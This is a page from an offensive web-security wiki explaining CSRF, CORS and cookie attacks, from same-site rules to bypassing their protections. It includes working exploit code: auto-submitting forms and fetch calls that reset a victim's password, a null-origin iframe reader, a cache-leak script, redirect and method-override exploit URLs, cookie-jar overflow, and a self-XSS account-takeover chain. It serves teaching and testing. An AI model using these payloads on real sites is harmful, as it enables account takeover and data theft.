---
description: >-
  Submitting data-altering requests blindly from your domain on the client-side.
  Cookies are automatically sent, often requiring CSRF tokens as protection
---

# Cross-Site Request Forgery (CSRF)

## Description

Websites need to be able to access their own sensitive content, while malicious websites should not be able to access that same data from another site. To make this possible, _browsers_ implement some **same-origin** and **same-site** policies. These either allow or deny an action based on the **origins** of the request. As you can read in the table below, _same-site_ is generally more allowing than _same-origin_:

<table><thead><tr><th width="244">Request from -></th><th width="216">-> Request to</th><th>Same-site?</th><th>Same-origin?</th></tr></thead><tbody><tr><td><code>example.com</code></td><td><code>example.com</code></td><td><mark style="color:green;"><strong>Yes</strong></mark></td><td><mark style="color:green;"><strong>Yes</strong></mark></td></tr><tr><td><code>app.example.com</code></td><td><code>other.example.com</code></td><td><mark style="color:green;"><strong>Yes</strong></mark></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched domain name</td></tr><tr><td><code>example.com</code></td><td><code>example.com:8080</code></td><td><mark style="color:green;"><strong>Yes</strong></mark></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched port</td></tr><tr><td><code>example.com</code></td><td><code>example.co.uk</code></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched <a href="https://publicsuffix.org/">eTLD</a></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched domain name</td></tr><tr><td><code>https://example.com</code></td><td><code>http://example.com</code></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched scheme</td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched scheme</td></tr></tbody></table>

Another term important to cookies is when requests are **'top-level'** or not. One simple definition is if the address bar matches the request being made. Redirection or `window.open()`, for example, are top-level navigations. A `fetch()` or `<iframe>`, however, are not, because the address bar shows a different address to the resource being requested.

## Same-origin & CORS

One feature that uses the **same-origin** policy is [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). This prevents an attacker from requesting a page from a website on a user's behalf and being able to read the response content. If this were not the case, any website could steal secrets from any other website by simply requesting them. \
This policy ensures certain response headers are explicitly set to allow cross-origin resource sharing.&#x20;

* [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)`: <origin> | *`: If this header is missing, no other origins are allows to read the body. If it is a valid origin, the body may be read if the requesting origin is the same as that in this header. If the value is "`*`" (wildcard), any origin may read the body.
* [`Access-Control-Allow-Credentials`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)`: true`: If this header is missing, it is interpreted as `false`. If it is instead explicitly set to `true`, the incoming request made by `fetch()` may include cookies, only if `...-Allow-Origin` is not `*` during the preflight request. \
  It must be a full origin. This is why some REST APIs simply reflect the incoming `Origin` header to allow any site to include cookies.

Fetch requests must explicitly ask to include cookies if they want to send cookies and read a response. This is done using the [`credentials:`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#sending_a_request_with_credentials_included) option. If by the [#same-site](cross-site-request-forgery-csrf.md#same-site "mention") rules explained below your background request is allowed to include cookies, and the `Access-Control` headers allow it, the following request will be authenticated and allow you to read the response cross-site:

```javascript
fetch("http://example.com/some_data", { 
    credentials: 'include' 
}).then((r) => r.text().then((t) => {
    console.log(t);
}));
```

### Origin Check Bypasses

Some sites conditionally add an `Access-Control-Allow-Origin:` header to the response if the request's `Origin:` comes from a trusted domain. If the check of this origin is flawed, you may be able to fool it with a special domain.

Test this by making the cross-site request you want to make, and change the `Origin:` header to some variations of a trusted domain. If the site **trusts** `api.example.com`, for example, try some of the following **registerable** permutations ([source](https://x.com/hackerscrolls/status/1294203081148768256)):

<table><thead><tr><th width="281">Technique</th><th>Examples</th></tr></thead><tbody><tr><td><strong>Any domain</strong></td><td><code>evil.com</code></td></tr><tr><td><strong>Different TLDs</strong></td><td><code>api.example.net</code><br><code>api.example.io</code></td></tr><tr><td><strong>Subdomains</strong> (requires XSS or subdomain takeover)</td><td><code>xss.api.example.com</code><br><code>takeover.api.example.com</code></td></tr><tr><td><strong>Pad domain from left</strong></td><td><code>evilexample.com</code><br><code>api-example.com</code></td></tr><tr><td><strong>Pad domain from right</strong></td><td><code>api.example.com.evil.com</code><br><code>api.example.comevil.com</code></td></tr></tbody></table>

If you can successfully send a request from any of the above origins and read a response, you have bypassed CORS!

### Origin: null

If the application responds with `Access-Control-Allow-Origin: null` by default, or when you set `Origin: null`, you are able to exploit this cross-site to read a response. Multiple ways allow you to send JavaScript requests from a `null` origin, such as the `<object>` tag or a sandboxed `<iframe>` ([source](https://x.com/hackerscrolls/status/1307252040993824775)):

```html
<body></body>
<script>
  const iframe = document.createElement("iframe")
  iframe.sandbox = "allow-scripts allow-modals"
  iframe.srcdoc = `<script>
    fetch("https://example.com").then(r => r.text().then(t => {
      top.postMessage(t, '*')
    }))
  <\/script>`
  document.body.appendChild(iframe)

  onmessage = (e) => {
    if (e.source == iframe.contentWindow) {
      alert(e.data)
    }
  }
</script>
```

### `Origin: *` with credentials (cache)

One common configuration is to set `Access-Control-Allow-Origin: *` in the response to some authenticated endpoint, without `Access-Control-Allow-Credentials: true`. `*` is special here in that it allows any origin to read the body, but because this is dangerous the browser will not allow such requests to be with cookies ("credentials").

You can bypass this restriction by abusing the **browser cache**. Every URL not explicitly denied from the cache using `Cache-Control` headers may be cached by the browser, and these caches are shared with sites under the same [_eTLD+1_](https://web.dev/articles/same-site-same-origin#public-suffix-list-etld). This means subdomains under one main domain will all share the same cache.

The attacker can first open the target page in a new top-level window, which will use cookies and cache the response, while not being able to read it. Then use the `cache: "force-cache"` option to fetch the response from the cache without sending a request or dealing with CORS, leaking the response from the first request:

<pre class="language-php" data-title="Vulnerable code (/api/profile)"><code class="lang-php">&#x3C;?php
<strong>header("Access-Control-Allow-Origin: *");
</strong>
// ... do something with $_SESSION and echo it
</code></pre>

<pre class="language-javascript" data-title="Exploit (xss.example.com)"><code class="lang-javascript">const TARGET = "https://example.com/api/profile";
onclick = async () => {
<strong>  w = window.open(TARGET, "popup");  // With cookies
</strong>  setTimeout(() => { w.close() }, 1000);

  // Get from cache without cookies or CORS
  const leak = await fetch(TARGET, {
<strong>    cache: "force-cache",
</strong>  }).then((response) => response.text())

  console.log(leak);
}
</code></pre>

Note that this doesn't work on a completely separate attacker's domain, because the [cache partition](https://developer.chrome.com/blog/http-cache-partitioning) will be different. You need to have an XSS on a subdomain to exploit this on the vulnerable domain. This trick also only works on Chromium-based browsers, Firefox does not seem to be affected.

### Preflight & Content Types

With `fetch()` requests (not forms), you can send very complex requests with custom headers and methods. Because these can be dangerous if authenticated by cookies, the browser will only allow sending [simple requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) cross-origin. Any more complex requests will first send a _Preflight_ request that asks the server what is allowed, and then decide on if the real request will be allowed or not.

You cannot, for example, add a `Content-Type: application/json` header to your request, or send a `PUT` method. You need to either find a "simple" alternative that is also accepted by the server, or be allowed via the preflight check.

One common problem is the server requiring a `Content-Type: application/json` body as a request to your sensitive endpoint. Exploiting this is non-trivial, but there are some edge cases where it is possible:

1. The server can also parse `Content-Type: application/x-www-form-urlencoded` data, and you can transform the JSON into such fields. Potentially creating arrays with duplicate parameters or `param[]=`, and creating objects with `obj[key]=value` syntax.
2. The server accepts `Content-Type: text/plain` with a JSON body, which can be created in a form like this:

{% code title="Exploit HTML" overflow="wrap" %}
```html
<form id=form action="https://example.com/reset_password" method="POST" enctype="text/plain">
  <input type="text" name='{"password":"hacked","dummy":"' value='"}'>
</form>
<script>form.submit();</script>
```
{% endcode %}

By putting arbitrary JSON data in the name/value, we can make the mandatory `=` separator part of a dummy string. To the server, this may look like a valid body and it even works with a top-level context.

<pre class="language-http" data-title="Request"><code class="lang-http">POST /reset_password HTTP/1.1
Host: example.com
<strong>Content-Type: text/plain
</strong>
{"password":"hacked","dummy":"="}
</code></pre>

3. The server accepts _missing Content-Type_ with a JSON body ([source](https://nastystereo.com/security/cross-site-post-without-content-type.html)):

{% code title="Exploit JavaScript" %}
```javascript
fetch("https://example.com/reset_password", {
  method: "POST",
  body: new Blob(['{"password":"hacked"}'])
});
```
{% endcode %}

This will send a request without a `Content-Type:` header. The server might then default to JSON and successfully parse your body:

{% code title="Request" %}
```http
POST /reset_password HTTP/1.1
Host: example.com

{"password":"hacked"}
```
{% endcode %}

4. Confuse the parser with a charset that looks like the JSON content type. Using `fetch()` it is possible to add a `;charset=` to the `Content-Type` header with very lax parsing. Read the research below for details:

{% embed url="https://github.com/BlackFan/content-type-research" %}
Research into Content Types, including ways to confuse x-www-form-urlencoded data for JSON
{% endembed %}

{% hint style="info" %}
**Tip**: If you are missing cookies even though `SameSite=None`, it's likely the result of [#third-party-cookie-protections](cross-site-request-forgery-csrf.md#third-party-cookie-protections "mention"). Try opening your target in a window from your site first to bypass it.
{% endhint %}

## Same-site

A different feature that uses the **same-site** policy is **Cookies**. On many websites cookies are all that authenticates the user. If a request includes the session cookie of a user, they are allowed to perform actions on their account. Simple as that.\
To make sure malicious websites cannot simply recreate a `<form>` and send it automatically to change a password, for example, these requests are checked to be _same-site_ (see table above). If the origins are not same-site the cookies will not be sent.&#x20;

In the early web days, this `SameSite` did not exist for cookies. Nowadays it is an attribute on cookies that may be `None` (no protections), `Lax` (default, some protections) or `Strict` (most protections).&#x20;

This value is important to know as it decides what kind of cross-site requests will be authenticated. The table above shows that at least **any subdomain on any port** will **bypass** same-site protections because it is considered same-site. This means that any [cross-site-scripting-xss](cross-site-scripting-xss/ "mention") vulnerability on such a website may lead to you being able to make authenticated requests!

All `SameSite=` values have the following meanings:

1. `SameSite=`<mark style="color:red;">**`None`**</mark>: _All_ cross-site requests to the cookie's origin will include cookies.&#x20;
2. `SameSite=`<mark style="color:blue;">**`Lax`**</mark>: _Only_ top-level GET requests will contain the cookie. Any other requests such as POST, `<iframe>`'s, `fetch()` or other background requests will not include this cookie.
3. `SameSite=`<mark style="color:green;">**`Strict`**</mark>: _No_ cross-site requests will include cookies. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie. A redirect is not sufficient here, as the origin at the time of redirection is still yours instead of the target.
4. `SameSite` is <mark style="color:yellow;">**missing**</mark>: When the attribute is not explicitly set for a cookie, it gets a little complicated because the browser tries to be backward compatible. For _Firefox_, the value will be **None** by default, with no restrictions. For _Chromium_, however, the value will be **Lax\*** by default. \
   \* This asterisk is saying that for the first 2 minutes of the cookie being set, it will be sent on cross-site top-level POST requests, in contrast to the normal Lax behavior. After this 2-minute window, the behavior mimics Lax completely, disallowing cross-site top-level POST requests again.

### Third-party cookie protections

While the above rules covered everything for a long time, privacy and tracking concerns pushed browsers to limit cross-site cookies even more. These rules only restrict requests that are not top-level. When you make a `fetch()` request, for example, the cookies will not be included, even if `SameSite=None`! This rule adds to the regular same-site rules.

All browsers are implementing this in slightly different ways, check out the documentation for each:

* Chromium: [Privacy Sandbox Tracking Protection](https://developers.google.com/privacy-sandbox/3pcd)
* Firefox: [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop#w_what-enhanced-tracking-protection-blocks)
* Safari: [Intelligent Tracking Prevention](https://webkit.org/blog/9521/intelligent-tracking-prevention-2-3/)

Because this movement is still in progress, there are some 'Heuristics based exceptions' to these rules that make cookies behave like before. This is to prevent certain authentication flows from breaking and include the following bypasses because it is not a security feature:

* [Chromium Heuristics](https://developers.google.com/privacy-sandbox/3pcd/temporary-exceptions/heuristics-based-exceptions): `window.open()` the target site and receive an interaction on the popup, whitelisting your site for 30 days for to access the target's third-party cookies from your site that opened it.
* [Firefox Heuristics](https://developer.mozilla.org/en-US/docs/Web/Privacy/State_Partitioning#storage_access_heuristics): `window.open()` the target site once (no interaction required), whitelisting your site for 30 days

{% embed url="https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/" %}
Research on this topic in major browsers, explaining more details
{% endembed %}

{% hint style="info" %}
**Tip**: For testing, you can manually disable these protections in Chromium with the ![](<../../.gitbook/assets/image (49).png>) icon, and in Firefox with the blue ![](<../../.gitbook/assets/image (50).png>) icon, both in the address bar for affected sites.
{% endhint %}

### Attack Examples

To get a more practical idea of these protections, here are some examples of what is and isn't allowed in modern browsers. Firstly, some practical examples of how an attacker's site can send POST data to another site if it is misconfigured:

{% code title="Using <form> (top-level)" overflow="wrap" %}
```html
<form id=form action="https://example.com/reset_password" method="POST" enctype="application/x-www-form-urlencoded">
    <input type="text" name="password" value="hacked">
</form>
<script>
    // Automatically submit
    form.submit();
</script>
```
{% endcode %}

{% code title="Using fetch() (background)" %}
```html
<script>
    fetch('https://example.com/reset_password', {
        method: 'POST',
        mode: 'no-cors',  // Prevent preflight request or errors
        credentials: 'include',  // Include cookies if allowed
        headers: {  // Parse body as form submission
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: 'password=hacked',
    })
</script>
```
{% endcode %}

Here both methods can achieve the same requests, but notice that one is top-level, while the other is not. The `<form>` method will work when the SameSite attribute is missing in Chromium-based browsers for the first 2 minutes of the cookie being set, as well as bypassing [#third-party-cookie-protections](cross-site-request-forgery-csrf.md#third-party-cookie-protections "mention") automatically. The `fetch()` method is more hidden but has more preconditions.&#x20;

With the `fetch()` method you can completely control the body data while using a `<form>` this is done for you depending on the `Content-Type` header (`enctype=` in HTML). \
This type can be changed to one of three values, which all have different formats. The `text/plain` type may be interesting if a server expects the `application/json` type which is normally impossible, but also accepts this as an alternative. Here are all three:

<pre class="language-http"><code class="lang-http">Content-Type: application/x-www-form-urlencoded
<strong>name1=value1&#x26;name2=value2
</strong>
Content-Type: multipart/form-data
<strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ
</strong><strong>Content-Disposition: form-data; name="name1"
</strong><strong>
</strong><strong>value1
</strong><strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ
</strong><strong>Content-Disposition: form-data; name="name2"
</strong><strong>
</strong><strong>value2
</strong><strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ--
</strong>
Content-Type: text/plain
<strong>name1=value1
</strong><strong>name2=value2
</strong></code></pre>

#### `SameSite=`<mark style="color:red;">`Strict`</mark>: bypassing using client-side redirect

As mentioned earlier, the SameSite protection only prevents cross-_site_ requests. If you can create a fake form or have javascript execution on a **sibling domain or different port**, this bypasses the restriction.&#x20;

If this is not possible, there is [another interesting method](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-using-on-site-gadgets). It's impossible to send an authenticated request from your own site, so why not try to send a request from the site you are already targeting? Any requests like **client-side redirects** will be **authenticated** because you are on the same site. For this to work the target endpoint that you want to execute, such as `/reset_password`, will need to allow GET requests with parameters. In a very flexible framework, this behavior might be common as query and body parameters are merged.&#x20;

Take the following gadget, which allows an unauthenticated client-side redirect using a parameter:

{% code title="Client-side redirect" %}
```javascript
// Redirect '?postId=42' to '/post/42'
const postId = new URL(location).searchParams.get("postId");
location = "/post/" + postId;
```
{% endcode %}

Note that while this is in a GET response, an unauthenticated POST response might also have a gadget like this to abuse. We can send such a request using the `<form>` technique from above. &#x20;

This gadget can be abused because after redirecting to this location from our malicious site, the next redirect will be authenticated as it is coming from the same site. Using a directory traversal sequence in the `?postId=` query parameter we can make it redirect to the vulnerable state-changing GET endpoint that was our initial target, and it will be authenticated with Cookies:

{% code title="Exploit URL" %}
```python
https://example.com/post?postId=../reset_password%3Fpassword%3Dhacked
```
{% endcode %}

#### `SameSite=`<mark style="color:blue;">`Lax`</mark>: method override

If you find a state-changing GET request or can trick the server into thinking a GET request is a POST request, you may still find impact. With backends like _PHP Symfony_ that have an extra `?_method=POST` parameter that can be set in a regular GET request to override the method internally:

{% code title="Exploit URL" %}
```python
https://example.com/reset_password?_method=POST&password=hacked
```
{% endcode %}

#### `SameSite=`<mark style="color:red;">`None`</mark>: Background requests

With this SameSite attribute, the cookie is treated as before SameSite was implemented. This means any techniques like the `<form>` or `fetch()` will work and send cookies using any request method. In such cases, you should check if any CSRF tokens are required; if not, there's a good chance you can make any victim send any state-changing request when they visit your site.&#x20;

#### `SameSite` is <mark style="color:yellow;">**missing**</mark>: `None` or abusing the 2-minute window

Remember that _Firefox_, a major browser, still defaults to `SameSite=None` when a cookie misses this attribute. On _Chromium_ browsers, it will still allow top-level POST requests for 2 minutes after the cookie is set, before fully committing to `SameSite=Lax`.&#x20;

This behaviour has a small chance of a victim just having logged in being exploitable. This is pretty unlikely, but a more powerful way to use this is if the site allows **resetting the cookie**. When it is set again by opening a new tab from your site, the timer is also reset and a CSRF is possible.&#x20;

{% code title="Exploit HTML" %}
```html
<form id=form action="https://example.com/reset_password" method="POST">
    <input type="text" name="password" value="hacked">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        // Reset cookie
        window.open('https://example.com/login');
        setTimeout(() => {
            // After it has been reset, CSRF well within the 2-minute window
            form.submit();
        }, 5000);
    }
</script>
```
{% endcode %}

### Multiple top-level requests

In some more complex chains, you may want to initiate multiple CSRF requests that require top-level navigation. The problem is that after redirecting, you no longer have control over the page and cannot start a second request.

[Me and someone else](https://x.com/J0R1AN/status/1842139861295169836) discovered ways around this, for both GET and POST requests:

1. **`GET`** requests can be sent in the background _with SameSite=Lax_ cookies by putting them in a `<link rel="prerender" href="...">` tag.
2. **`GET/POST`** requests can be sent as top-level navigations using `<form>` elements that are automatically submitted using `form.submit()`. Most often during CSRF you don't care about the response, only that the request with cookies reaches the server and gets processed.\
   The trick is that you can cancel the navigation quickly after it is started using `window.stop()` or by initiating a different navigation. You will still be on the attacker's page if the browser hasn't received a response yet. \
   The following gist contains reusable proof of concepts for this technique:\
   [https://gist.github.com/JorianWoltjer/b9163fe616319db8fe570b4ef9c02291](https://gist.github.com/JorianWoltjer/b9163fe616319db8fe570b4ef9c02291)

### Cookie Tossing

[This post](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html) and [this writeup](https://github.com/google/google-ctf/tree/main/2024/quals/web-game-arcade#subdomain) show examples of this technique. From a subdomain, it is possible to set cookies on all other subdomains. Using the [`Domain=`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#domaindomain-value) attribute from the `xss.example.com` domain you could set a `name=value; domain=.example.com` cookie to add a cookie to all other domains under `example.com`. The only exceptions to this are in the [Public Suffix List](https://publicsuffix.org/list/).

On any subdomain of your target you just need an XSS to be able to set `document.cookie`, a header injection to set `Set-Cookie:` or even an injection in an existing cookie that will allow you to set multiple. If you have input into any cookie that is set through a query string or similar attacker-controlled input, check out these articles to see if you can confuse the parser into injecting new cookies:

* ["Cookie Bugs - Smuggling & Injection"](https://blog.ankursundara.com/cookie-bugs/)
* ["Stealing HttpOnly cookies with the cookie sandwich technique"](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)
* ["Bypassing WAFs with the phantom $Version cookie"](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
* ["Grehack - Another HTML Renderer writeup"](https://mizu.re/post/another-html-renderer)

This ability can lead to all sorts of attacks like Self-XSS becoming exploitable, messing with flows, etc. because a developer may not expect the attacker to have control over the victim's cookies.

Using the [`Path=`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#pathpath-value) cookie attribute, you can even force the cookies to one specific path. The other cookies from the victim will stay active on other pages, potentially leading to complex attacks where different sessions are used for different requests ([more info](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#define_where_cookies_are_sent)).

#### Cookie order

Cookies in the `Cookie:` header are sorted based firstly on `Path=` length, and second on time of creation. This means that any injected cookies after the victim already has a session will be appended to the _end_ by default, as they are created later. But by increasing the specificity of the path of your injected cookie, it can be placed _before_ the existing cookies, even though it is set later.

This is important because server-side parsers often take the _first_ occurrence of a cookie if there are more of the same name. This may let you successfully overwrite its value.

#### Removing cookies

Cookies are stored in the "cookie jar", which has a limited site. Using JavaScript it is possible to set many cookies which will overflow the previous cookies and only keep the overflow once. Then, removing these makes it possible to have a clean session without any cookies. This will allow resetting `httpOnly` cookies, and allow you to overwrite them afterward.

{% code title="Cookie Jar Overflow" %}
```javascript
for (let i = 0; i < 300; i++) {
  document.cookie = `overflow${i}=A; Secure`
}
for (let i = 0; i < 300; i++) {
  document.cookie = `overflow${i}=A; Expires=Thu, 01 Jan 1970 00:00:01 GMT`
}
document.cookie = "new_cookie=value"
```
{% endcode %}

This trick even works same-site, so you can delete cookies from other origins under the same domain:

{% code title="sub.example.com -> example.com" %}
```javascript
for (let i = 0; i < 300; i++) {
  document.cookie = `overflow${i}=A; Domain=.example.com; Secure`
}
for (let i = 0; i < 300; i++) {
  document.cookie = `overflow${i}=A; Domain=.example.com; Expires=Thu, 01 Jan 1970 00:00:01 GMT`
}
```
{% endcode %}

#### `__Host-` prefix

Any cookie prefixed with [`__Host-`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#cookie_prefixes) will be locked to the specific host it was set on, not the site. These cookies need to follow some requirements:

* `Secure` attribute is set and this is a secure origin
* No `Domain=` attribute allowed
* `Path=` is set to `/`

{% hint style="warning" %}
Setting host-prefixed cookies on `localhost` domains doesn't work, experiment with these things on real domains and the DevTools Console to ensure correct behavior. These domains are normally exempt from `Secure` restrictions, but it appears to be [tracked as a bug](https://issues.chromium.org/issues/40196122) in Chrome and not all features will work this way.
{% endhint %}

It only restricts what attributes are set on the cookies, not how they are used afterward. So, all the same rules apply based on the attributes set. For example, these cookies will still be sent in same-site requests from different origins, useful for CSRF vulnerabilities.

One thing that shouldn't be possible is _overwriting_ this cookie from a subdomain with Cookie Tossing. This is because the `Domain=` attribute cannot be globally set to `.example.com`, it must be set to the current host. However, this is only true for `__Host-` prefixed cookies. You can imagine that if we are able to confuse the backend cookie parser into reading a regular cookie that we can set, as a cookie with the special prefix, it would bypass this restriction.

In PHP, for example, there was a vulnerability ([GHSA-wpj3-hf5j-x4v4](ttps://github.com/php/php-src/security/advisories/GHSA-wpj3-hf5j-x4v4)) where certain characters would be replaced with underscores (`_`). By placing these characters in a "regular" cookie, it could be parsed as a host-prefixed cookie by the server.\
There are also tricks possible with _nameless_ cookies, such as previously in Werkzeug ([GHSA-px8h-6qxv-m22q](https://github.com/advisories/GHSA-px8h-6qxv-m22q)).

#### Self-XSS exploitation using Path

If a Stored XSS vulnerability is only exploitable from your account with a carefully prepared payload, it's hard to find impact because the victim must be signed into your account for it to trigger. Then, there is no sensitive information to leak or actions to perform.

One possible trick is to _keep sensitive information open_ before the attack, and then use a window reference (such as `opener`) with same-origin XSS to leak the already rendered information. Of course this requires some automated way to log the victim into your account, which maybe be using a login form CSRF, or commonly with the last step of OAuth (SSO) authentication where the authentication code gives the user a session if they are redirected to it. This attack chain will look like:

1. From the attacker's site, open a new window. Then redirect the initial window to a page containing sensitive information you want to leak
2. In the new window, perform the login CSRF, likely involving another window needing to be opened
3. From the new window, send the victim now logged in to your account, to the Self-XSS page so it triggers and you have JavaScript execution
4. Read `opener.document.innerHTML` which contains the sensitive information from step 1, which you will be able to read because it is on the same origin

You can't always find impact in only leaking data, sometimes you want to _change_ data by sending arbitrary requests with the victim's session. This is more complicated because after the login CSRF, the victim's session will be forgotten.

Originally well explained in ["Turning unexploitable XSS into an account takeover with Matan Berson"](https://www.youtube.com/watch?v=_VGEtJSRkjg), it is possible to use Cookie Tossing techniques to store an XSS that will trigger later. The idea is to use the Self-XSS to first remove all cookies and then add a cookie with a specific path and the attacker's session. Whenever this path is requested, the attacker's session with a prepared XSS payload will be used. This may trigger whenever the victim naturally uses the site again and is logged in to their account, and browses to the path that we stored a cookie on. Or, a second attacker step is needed to redirect the victim to that path later when they are naturally logged in to their account.

[This post](https://vitorfalcao.com/posts/hacking-high-profile-targets/) explains the idea in more detail. In summary, the steps are as follows:

1. Perform a login CSRF to get the victim's browser into the attacker's account
2. Open the Self-XSS which gets you JavaScript control inside the attacker's account
3. Overflow the cookie jar (see [#removing-cookies](cross-site-request-forgery-csrf.md#removing-cookies "mention")) to log the victim out again, while still having JavaScript running
4. Set a cookie with the path where the Self-XSS comes from so that only that endpoint will use the attacker's session
5. Let the user naturally log in to their account
6. The victim naturally browses to the Stored XSS payload, or we have to redirect them again. Either way, the XSS will now be in the victim's session so you can make any authenticated requests

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>Flow diagram of the attack with different windows</p></figcaption></figure>

### Other cookie attacks

If CSRF attacks are not possible due to protections like [#csrf-tokens](cross-site-request-forgery-csrf.md#csrf-tokens "mention"), but the SameSite attribute is still quite forgiving, there are more techniques involving the auto-sending behavior of most cookies. Most involve **references to a window** of the target site being authenticated. This can either be a top-level context using `window.open()` or redirection with `location=`, or a third-party context using `<iframe>`'s.&#x20;

Here are some examples of how to get window reference containing your target:

<pre class="language-html"><code class="lang-html">&#x3C;script>
    // Blocked by popup-blocker by default, because no interaction triggered it
    window.open("https://example.com");
    // Successfully open a *new tab* of 'example.com' upon clicking anywhere
    let w1;
<strong>    onclick = () => {
</strong><strong>        w1 = window.open("https://example.com");
</strong><strong>        console.log(w1);
</strong><strong>    }
</strong>    // Successfully open a *popup* of 'example.com' upon clicking anywhere
    let w2;
<strong>    onclick = () => {
</strong><strong>        w2 = window.open("https://example.com", '', 'width=100,height=100');
</strong><strong>        console.log(w2);
</strong><strong>    }
</strong>&#x3C;/script>
</code></pre>

#### [Clickjacking](https://portswigger.net/web-security/clickjacking)

If the target page allows being put into an `<iframe>`, your site above the iframe can put a barely transparent overlay over the frame to trick the user into clicking certain parts of the frame. This technique known as 'clickjacking' requires cookies in a third-party context, and thus `SameSite=None`, but can be very effective if there is enough reason for the user to follow your instructions, like a game or a captcha.

Instead of clicks, this technique can go even further with overwriting clipboard/drag data to make the user unintentionally fill in forms, or carefully show parts of the iframe to make the user re-type what is on their screen back to you.

#### [XS-Leaks](https://xsleaks.dev/)

XS-Leaks are a more recently developed attack surface that can go very deep. The idea is to abuse your window reference or probe the requests to the target site in order to leak some information about the response. A common exploit for this is detecting if something exists, like a private project URL or query result. By repeating leaks for search functionality, you can find strings included in the response slowly to exfiltrate data from a response cross-site (called 'XS-Search').

#### [postMessage Exploitation](../../languages/javascript/postmessage-exploitation.md)

{% content-ref url="../../languages/javascript/postmessage-exploitation.md" %}
[postmessage-exploitation.md](../../languages/javascript/postmessage-exploitation.md)
{% endcontent-ref %}

## Protections

There are many possible protections for CSRF vulnerabilities, and implementations vary a lot. Below are some of the most common and how they may be bypassed.

### CSRF Tokens

However, the reality is slightly more complicated. Because these rules are so lax, most sites implement their own protection: **CSRF Tokens**. These are extra fields on a form that are randomly generated, but attached to the user's session. Whenever a form is submitted, the extra CSRF token field is validated to match the session and only then will it be considered authenticated. \
A malicious site won't know this randomly generated token and therefore cannot make a fake request that includes it. This is assuming however that:

1. This token is _implemented;_
2. This token is _generated securely;_
3. This token is _unique per user_.

{% embed url="https://portswigger.net/web-security/csrf/bypassing-token-validation" %}
Explanation of various common mistakes in CSRF tokens, and how to exploit them
{% endembed %}

### Double-Submit Pattern (CSRF Cookies)

The [Double-Submit Pattern](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#naive-double-submit-cookie-pattern-discouraged) is a solution to CSRF vulnerabilities by adding a random `csrf=` cookie that must match that `csrf=` parameter given in the POST body. An attacker won't know the random value of the cookie set on the vicitm, so they can't match this in the body.

This protection is however partially flawed because cookies can be set by subdomains too, through [#cookie-tossing](cross-site-request-forgery-csrf.md#cookie-tossing "mention"). From any subdomain or different port that you can get XSS on, you may write an arbitrary known `csrf=` cookie on the main domain that you can now match in the body. Note that the order of the cookies may be important, using a more specific path can get your injected cookie to be placed _before_ the real cookie in the HTTP request.

Sometimes it is also possible to _inject_ cookies through some query parameter or similar, where special characters like `;` or `"` are not escaped. This may allow you to append extra cookies in the returned `Set-Cookie:` header and set specific attributes like `Path:` or `Domain:`, also only needed in any subdomain of the target.

### Referer/Origin header checks

The [`Referer:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header contains the website that the request came from. If on an attacker's page, you redirect to the target website, this header will contain `https://attacker.com` and reveal to the target that this request may be malicious.

This header is not always set the same, however. Using the [`Referrer-Policy:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) on an attacker's domain, you can "protect" the attacker's site from leaking its domain to the target. Setting this to `no-referrer` will not send the header, and the target may now trust the request. Alternatively setting it to `unsafe-url` will send the whole URL instead of just the domain, potentially allowing you to confuse the parser trying to check if it is a trusted domain or not. By starting/ending the request with the target domain or replacing the RegEx `.` with any character, for example.

{% embed url="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses" %}
Explaining removing the Referer header and tricking the check
{% endembed %}

[`Origin:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) is a header used in CORS requests to tell the server where the request came from. To a developer, it would sound logical to use this as CSRF protection because the header won't be sent in same-origin requests, only in cross-origin ones like `fetch("https://example.com/reset_password?password=hacked")`. The problem is that this header won't be sent in all scenarios, such as `<img>` loads:

```html
<img src="https://example.com/reset_password?password=hacked">
```

It also won't be sent in top-level navigations such as using forms, allowing even `SameSite=Lax` cookies to be affected.
